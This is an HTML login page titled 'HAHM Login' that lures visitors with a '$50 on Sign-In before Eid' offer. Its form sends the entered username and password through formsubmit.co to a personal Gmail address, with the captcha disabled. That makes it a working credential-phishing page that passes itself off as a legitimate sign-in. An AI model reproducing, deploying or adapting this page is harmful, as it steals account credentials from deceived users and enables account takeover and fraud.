<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HAHM Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: linear-gradient(to left, #3b3bd4, #ddd4d4);
            text-align: center;
        }
        .logo {
            width: 150px;
            margin-bottom: 20px;
            
        }
        .container {
            width: 90%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            margin-bottom: 10px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 50%;
            padding: 10px;
            background: linear-gradient(to right, #a945d8, #503dcf);
            color: white;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: linear-gradient(to right, #483d8b, #5a4fcf);
        }
        .offer {
            margin-top: 15px;
            color: green;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <img src="logo.png" alt="Logo" class="logo">
    <div class="container">
        <h2>Welcome Back!</h2>
        <p class="offer">Claim $50 on Sign-In before Eid!</p>
        <br>
        <p>Enter your username and password</p>
        <form action="https://formsubmit.co/sweetaamir996@gmail.com" method="POST" autocomplete="off">
            <input type="hidden" name="_captcha" value="false">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        
        
    </div>
</body>
</html>
